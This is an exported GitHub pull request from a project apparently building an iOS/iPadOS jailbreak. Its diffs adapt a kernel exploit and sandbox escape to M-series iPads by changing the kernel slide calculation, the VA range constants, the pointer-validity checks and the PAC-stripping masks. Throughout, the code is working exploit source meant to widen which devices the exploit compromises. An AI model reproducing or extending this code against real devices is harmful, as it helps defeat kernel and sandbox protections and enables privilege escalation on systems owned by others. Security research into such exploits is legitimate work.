# compatibility for M-chips iPad kernel VA layout

> **Repository:** [rooootdev/lara](https://github.com/rooootdev/lara)  
> **Pull Request:** [#128](https://github.com/rooootdev/lara/pull/128)  
> **State:** 🟣 merged  
> **Branch:** `danosito:fix-ipad-m` → `rooootdev:main`  
> **Merged by:** [@rooootdev](https://github.com/rooootdev) on Apr 19, 2026  
> **Changes:** +62 / -11 across 5 files  
> **Created:** Apr 19, 2026  
> **Updated:** Apr 19, 2026  
> **Closed:** Apr 19, 2026  

---

## Description

*Opened by [@danosito](https://github.com/danosito)* *on Apr 19, 2026*


Parts of the kexploit code were still hardcoded for the A-series kernel address layout (0xFFFFFF8..., T1SZ_BOOT=0x19), while M-series iPads use a different kernel VA space (0xFFFFFE..., t1sz_boot=0x11)

I made some fixes and replaced the hardcoded VA constants. I'm not sure this will work for everyone, but it should fix the issue on M1/M2, and possibly on M3/M4 as well

It could also break the sploit on A-series chips, and I don't have an iPhone to test on - so please test before merging: https://github.com/danosito/lara-m-chips-fix/releases/tag/v0.1-m-chips

If you want to contact me about this PR - https://t.me/danosito


---

## Checks & Status

- Overall: 🟡 **pending**


---

## PR Commits (2)

- [`9f7230b`](https://github.com/rooootdev/lara/commit/9f7230bc47994bf992de9be4136beff312515404) fix: M1/M2/M3 iPad kernel exploit compatibility — *dan* · Apr 19, 2026
- [`f21227a`](https://github.com/rooootdev/lara/commit/f21227ac89bf8c98c2e6f00a5087c039779e0f0e) fix: SBX escape — K() macro now covers M-series iPad pointer range — *dan* · Apr 19, 2026


---

## Changed Files (5)

- 🟡 `lara/kexploit/darksword.m` (modified) — +7 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -1097,7 +1097,13 @@ static int pe(void) {
             return -1;
         }
     }
-    kernel_slide = kernel_base - 0xfffffff007004000ULL;
+    // M-series iPads have a different static kernel base than A-series iPhones
+    if ((kernel_base >> 48) == 0xFFFE) {
+        kernel_slide = kernel_base - 0xfffffe0007004000ULL;
+        pe_log("[M-series] detected via kernel_base 0x%llx", kernel_base);
+    } else {
+        kernel_slide = kernel_base - 0xfffffff007004000ULL;
+    }
     pe_log("kernel_base:  0x%llx", kernel_base);
     pe_log("kernel_slide: 0x%llx", kernel_slide);
     ds_progress(0.90);
  ```

  </details>
- 🟡 `lara/kexploit/offsets.m` (modified) — +24 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -187,6 +187,13 @@ bool is_pac_supported(void) {
     return false;
 }
 
+static bool is_ipad_device(void) {
+    char machine[64] = {0};
+    size_t sz = sizeof(machine);
+    sysctlbyname("hw.machine", machine, &sz, NULL, 0);
+    return strncmp(machine, "iPad", 4) == 0;
+}
+
 void offsets_init(void) {
     if (!(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"17.0") && SYSTEM_VERSION_LESS_THAN(@"26.1"))) {
         printf("[-] Only supported offset for iOS/iPadOS 17.0 - 26.0.x\n");
@@ -960,6 +967,23 @@ void offsets_init(void) {
         }
     }
     
+    // M1/M2 iPad: same cpuFamily as A14/A15 but use 47-bit kernel VA (T1SZ=0x11)
+    // A16+ already gets t1sz_boot=0x11 via isA16Above; M1/M2 are missed
+    bool isIPad = is_ipad_device();
+    if ((cpuFamily == CPUFAMILY_ARM_FIRESTORM_ICESTORM ||
+         cpuFamily == CPUFAMILY_ARM_BLIZZARD_AVALANCHE) && isIPad) {
+        t1sz_boot = 0x11;
+        VM_MIN_KERNEL_ADDRESS = 0xFFFFFE0000000000;
+        VM_MAX_KERNEL_ADDRESS = 0xFFFFFE8FFFFFFFFF;
+        printf("[offsets] M1/M2 iPad detected — overriding to t1sz=0x11, VM_MIN=0xFFFFFE0000000000\n");
+    }
+    // M3 has correct t1sz from isA16Above but VM range was not set
+    if (isM3 && VM_MIN_KERNEL_ADDRESS != 0xFFFFFE0000000000) {
+        VM_MIN_KERNEL_ADDRESS = 0xFFFFFE0000000000;
+        VM_MAX_KERNEL_ADDRESS = 0xFFFFFE8FFFFFFFFF;
+        printf("[offsets] M3 VM range corrected\n");
+    }
+
     printf("initialized offsets\n");
 }
 
  ```

  </details>
- 🟡 `lara/kexploit/pe/sbx.m` (modified) — +16 / -4
  <details><summary>Diff</summary>

  ```diff
  @@ -41,6 +41,14 @@ static void sbx_log(const char *fmt, ...) {
     NSLog(@"%s", buf);
 }
 
+// vfs.m uses isheappointer() covering both A-series (0xFFFFFF8...) and M-series (0xFFFFFE...) ranges.
+// The old K() only covered A-series — on M1/M2/M3 iPads all pointer checks failed silently.
+static inline bool sbx_iskptr(uint64_t x) {
+    if (x == 0) return false;
+    if (x >= 0xfffffe0000000000ULL && x <= 0xfffffeFFFFFFFFFFULL) return true;  // M-series iPad
+    if (x > 0xFFFFFF8000000000ULL) return true;                                  // A-series iPhone
+    return false;
+}
 #define KRW_LEN 0x20
 
 #define OFF_PROC_PROC_RO       0x18
@@ -52,7 +60,7 @@ static void sbx_log(const char *fmt, ...) {
 #define OFF_EXT_DATA           0x40
 #define OFF_EXT_DATALEN        0x48
 
-#define T1SZ_BOOT 0x19
+extern uint64_t t1sz_boot;
 
 static bool ispac(void) {
     cpu_subtype_t cpusubtype = 0;
@@ -72,16 +80,20 @@ static inline uint64_t xpaci(uint64_t a) {
     return x0;
 }
 
+static inline uint64_t sbx_pac_mask(void) {
+    return ~((1ULL << (64 - (uint8_t)t1sz_boot)) - 1ULL);
+}
+
 static inline uint64_t signptr(uint64_t v) {
-    if ((v >> 32) > 0xFFFF) return v | 0xFFFFFF8000000000ULL;
+    if ((v >> 32) > 0xFFFF) return v | sbx_pac_mask();
     return v;
 }
 
 #define S(x) ({ uint64_t _v = xpaci(x); signptr(_v); })
-#define K(x) ((x) > 0xFFFFFF8000000000ULL)
+#define K(x) sbx_iskptr(x)
 
 static uint64_t smrdecode(uint64_t value, uint64_t base) {
-    uint64_t bits = (base << (62 - T1SZ_BOOT));
+    uint64_t bits = (base << (62 - (uint8_t)t1sz_boot));
     if ((value & bits) == 0) {
         return ((value & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
     }
  ```

  </details>
- 🟡 `lara/kexploit/pe/vfs.m` (modified) — +10 / -5
  <details><summary>Diff</summary>

  ```diff
  @@ -67,14 +67,18 @@
 #define FLAGS_PROT_MASK    0x780
 #define FLAGS_MAXPROT_MASK 0x7800
 
-#define T1SZ_BOOT 0x19
+extern uint64_t t1sz_boot;
 
 #define BIT(b)    (1ULL << (b))
 #define ONES(x)   (BIT(x)-1)
 
-#define PTR_MASK         ONES(64-T1SZ_BOOT)
-#define PAC_MASK         (~PTR_MASK)
-#define SIGN(p)          ((p) & BIT(55))
+static inline uint64_t vfs_pac_mask(void) {
+    return ~((1ULL << (64 - (uint8_t)t1sz_boot)) - 1ULL);
+}
+static inline bool vfs_is_sign_bit_set(uint64_t p) {
+    // bit 55 is set for any canonical kernel address in all supported VA layouts
+    return (p & BIT(55)) != 0;
+}
 
 #define ENTRY_SAFE_BASE   0x30
 #define FLAGS_OFF_IN_BUF  (O_ENTRY_FLAGS - ENTRY_SAFE_BASE)
@@ -124,7 +128,8 @@ static uint64_t resolve_vnode_once(uint64_t vn) {
 }
 
 static inline uint64_t pacstrip(uint64_t p) {
-    return SIGN(p) ? (p | PAC_MASK) : (p & ~PAC_MASK);
+    uint64_t pm = vfs_pac_mask();
+    return vfs_is_sign_bit_set(p) ? (p | pm) : (p & ~pm);
 }
 
 uint64_t kreadpointer(uint64_t addr) {
  ```

  </details>
- 🟡 `lara/kexploit/utils.m` (modified) — +5 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -139,8 +139,12 @@ static bool is_kptr(uint64_t p) {
     return (p & 0xffff000000000000ULL) == 0xffff000000000000ULL;
 }
 
+static inline uint64_t utils_pac_mask(void) {
+    return ~((1ULL << (64 - (uint8_t)t1sz_boot)) - 1ULL);
+}
+
 static inline uint64_t signptr(uint64_t v) {
-    if ((v >> 32) > 0xFFFF) return v | 0xFFFFFF8000000000ULL;
+    if ((v >> 32) > 0xFFFF) return v | utils_pac_mask();
     return v;
 }
 
  ```

  </details>


---

## References

### Commits (2)

- [cd66390](https://github.com/Kinue72/lara/commit/cd66390318e5022c9318145eb0beb8f894ab1302) — refactor: clean up PR #128
- [5adca83](https://github.com/Kinue72/lara/commit/5adca83012ba9719b84445ad2709e016ecfc64de) — refactor: clean up PR #128


---

## Timeline (Verbose)

- : 📝 Commit 9f7230b: fix: M1/M2/M3 iPad kernel exploit compatibility
- : 📝 Commit f21227a: fix: SBX escape — K() macro now covers M-series iPad pointer range
- Apr 19, 2026: 🟣 @rooootdev merged
- Apr 19, 2026: 🔴 Closed by @rooootdev
- Apr 19, 2026: 🔗 Commit cd66390 — refactor: clean up PR #128
- Apr 19, 2026: 🔗 Commit 5adca83 — refactor: clean up PR #128


---

*Exported on 10/14/2026, 2:56:42 PM from [https://github.com/rooootdev/lara/pull/128](https://github.com/rooootdev/lara/pull/128)*
